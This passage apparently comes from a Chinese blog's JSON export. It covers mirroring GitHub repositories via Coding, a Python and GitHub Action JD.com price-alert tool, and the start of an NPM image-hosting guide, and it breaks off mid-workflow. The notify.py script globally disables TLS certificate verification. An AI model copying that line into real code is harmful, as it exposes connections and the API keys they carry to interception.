导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-python@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">python-version:</span> <span class=\"number\">3.7</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Run</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">python</span> <span class=\"string\">main.py</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Push</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.email</span> <span class=\"string\">\"icolabot@e.yfun.top\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">config</span> <span class=\"string\">--local</span> <span class=\"string\">user.name</span> <span class=\"string\">\"iColaBot\"</span></span><br><span class=\"line\">          <span class=\"string\">date</span> <span class=\"string\">+\"%Y-%m-%d</span> <span class=\"string\">%H:%M:%S.%N\"</span> <span class=\"string\">&gt;</span> <span class=\"string\">date.txt</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">add</span> <span class=\"string\">-A</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">commit</span> <span class=\"string\">-am</span> <span class=\"string\">\"Update price.json\"</span></span><br><span class=\"line\">          <span class=\"string\">git</span> <span class=\"string\">push</span> <span class=\"string\">origin</span> <span class=\"string\">master</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><h2>\n<a href=\"https://blog.yfun.top/#%E6%B3%A8%E6%84%8F\" class=\"headerlink\" title=\"注意\"></a>注意</h2>\n<p>计划任务语法有 5 个字段，中间用空格分隔，每个字段代表一个时间单位。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">┌───────────── 分钟 (0 - 59)</span><br><span class=\"line\">│ ┌───────────── 小时 (0 - 23)</span><br><span class=\"line\">│ │ ┌───────────── 日 (1 - 31)</span><br><span class=\"line\">│ │ │ ┌───────────── 月 (1 - 12 或 JAN-DEC)</span><br><span class=\"line\">│ │ │ │ ┌───────────── 星期 (0 - 6 或 SUN-SAT)</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">│ │ │ │ │</span><br><span class=\"line\">* * * * *</span><br></pre></td></tr></table></figure><p>每个时间字段的含义：</p>\n<table>\n<thead><tr>\n<th align=\"center\">符号</th>\n<th align=\"center\">描述</th>\n<th align=\"center\">举例</th>\n</tr></thead>\n<tbody>\n<tr>\n<td align=\"center\"><code>*</code></td>\n<td align=\"center\">任意值</td>\n<td align=\"center\">\n<code>* * * * *</code> 每天每小时每分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>,</code></td>\n<td align=\"center\">值分隔符</td>\n<td align=\"center\">\n<code>1,3,4,7 * * * *</code> 每小时的 1 3 4 7 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>-</code></td>\n<td align=\"center\">范围</td>\n<td align=\"center\">\n<code>1-6 * * * *</code> 每小时的 1-6 分钟</td>\n</tr>\n<tr>\n<td align=\"center\"><code>/</code></td>\n<td align=\"center\">每</td>\n<td align=\"center\">\n<code>*/15 * * * *</code> 每隔 15 分钟</td>\n</tr>\n</tbody>\n</table>\n<blockquote><p>注：由于 GitHub Actions 的限制，如果设置为 <code>* * * * *</code> 实际的执行频率为每 5 分执行一次。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>新建文件 并 配置 <code>notify.py</code> 后，GitHub Action 就会定时执行代码。如果有降价或涨价，就会按照 <code>notify.py</code> 的配置进行通知。</p>\n<p>京东也有降价提醒的功能，但我实在是不想给 京东 开通知权限，经常推送商品广告。</p>\n<p>本文部分内容参考：<a href=\"https://github.com/justjavac/auto-green#readme\">justjavac/auto-green#readme</a></p>\n","link":"https://blog.yfun.top/posts/1238639652/"},{"title":"我的图床解决方案","date":"2021-05-08 10:30:00","description":"\n<p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p>\n<p>图床的选择有很多，<a href=\"https://blog.yfun.top/posts/3867215122/\">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：NPM。</p>\n<blockquote><p>本文假设您已有 NPM 账号、GitHub 账号。</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93\" class=\"headerlink\" title=\"新建仓库\"></a>新建仓库</h3>\n<p>新建一个 GitHub 仓库，公开或是私人都可以，此处不再赘述。</p>\n<p>在 Git 仓库中新建 <code>rawimg/.gitkeep</code> 与 <code>webpimg/.gitkeep</code> 两个文件。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E8%8E%B7%E5%8F%96%E4%BB%A4%E7%89%8C\" class=\"headerlink\" title=\"获取令牌\"></a>获取令牌</h3>\n<p>登录 <a href=\"https://npmjs.com/\">https://npmjs.com</a> ，点击右上角的头像，进入 <code>Access Token</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/1Xbrlw.png\"></p>\n<p>点击页面中的 <code>Generate New Token</code> 获取新的令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OQMmsB.png\"></p>\n<p>选择 <code>Automation</code>，点击 <code>Generate Token</code> 生成令牌。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/4Ob3xs.png\"></p>\n<p>将生成的令牌复制下来。</p>\n<p>进入 GitHub 仓库，点击 <code>Settings</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UfBqld.png\"></p>\n<p>点击菜单栏中的 <code>Secrets</code>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/SStNlF.png\"></p>\n<p>点击 <code>New repository secret</code> 新建一个 Secret。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/UYSnao.png\"></p>\n<p>Secret Name 为 <code>NPM_TOKEN</code>，Value 是你的 NPM 令牌，点击 <code>Add secret</code> 添加。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.8/rawimg/OY4C6A.png\"></p>\n<p>在仓库中新建 <code>package.json</code> 文件，参考如下：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">{</span><br><span class=\"line\">  <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"ocoke-osg\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"version\"</span>: <span class=\"string\">\"0.0.0\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"description\"</span>: <span class=\"string\">\"Somewhere to save the file from @oCoke\"</span>,</span><br><span class=\"line\">  <span class=\"attr\">\"author\"</span>: <span class=\"string\">\"YFun(@oCoke)\"</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E4%B8%8E%E5%8F%91%E5%B8%83\" class=\"headerlink\" title=\"图片转换与发布\"></a>图片转换与发布</h2>\n<p>为了方便多端写作，我使用 GitHub 临时存储所需的图片，GitHub Action 发布 NPM 包。</p>\n<p>WebP 可以大大缩减图片的尺寸，我们还可以借助 GitHub Action 在发布前自动转换。</p>  <details class=\"post-details\"><summary>GitHub Action 代码 (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">NPM</span> <span class=\"string\">&amp;</span> <span class=\"string\">WebP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 在 Release 发布时 或手动执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">release:</span></span><br><span class=\"line\">     <span class=\"attr\">types:</span></span><br><span class=\"line\">       <span class=\"bullet\">-</span> <span class=\"string\">published</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">workflow_dispatch:</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">publish-npm:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"comment\"># Clone 仓库</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Checkout</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">ref:</span> <span class=\"string\">master</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装 Node.js    </span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Setup</span> <span class=\"string\">Node</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/setup-node@v1</span></span><br><span class=\"line\">        <span class=\"attr\">with:</span></span><br><span class=\"line\">          <span class=\"attr\">node-version:</span> <span class=\"string\">\"12.x\"</span></span><br><span class=\"line\">          <span class=\"attr\">registry-url:</span> <span class=\"string\">https://registry.npmjs.org/</span></span><br><span class=\"line\">        </span><br><span class=\"line\">      <span class=\"comment\"># rawimg/ 作为原始图片存储，webpimg/ 作为压缩图片存储处，最后合并。</span></span><br><span class=\"line\">      <span class=\"comment\"># 安装相关插件，转换图片。</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Install</span> <span class=\"string\">&amp;</span> <span class=\"string\">Convert</span></span><br><span class=\"line\">        <span class=\"attr\">run:</span> <span class=\"string\">|</span></span><br><span class=\"line\">          <span class=\"string\">npm</span> <span class=\"string\">install</span> <span class=\"string\">-g</span> <span class=\"string\">webp-batch-convert</span></span><br><span class=\"line\">          <span class=\"string\">cwebp-batch</span> <span class=\"string\">--in</span> <span class=\"string\">rawimg</span> <span class=\"string\">--out</span> <span class=\"string\">webpimg</span> <span class=\"string\">-q</span> <span class=\"number\">75</span> <span class=\"string\">-quiet</span></span><br><span class=\"line\">          <span class=\"string\">mv</span> <span class=\"string\">webpimg/*.webp</span> <span class=\"string\">rawimg/</span></span><br><span class=\"line\">          </span><br><span class=\"line\">   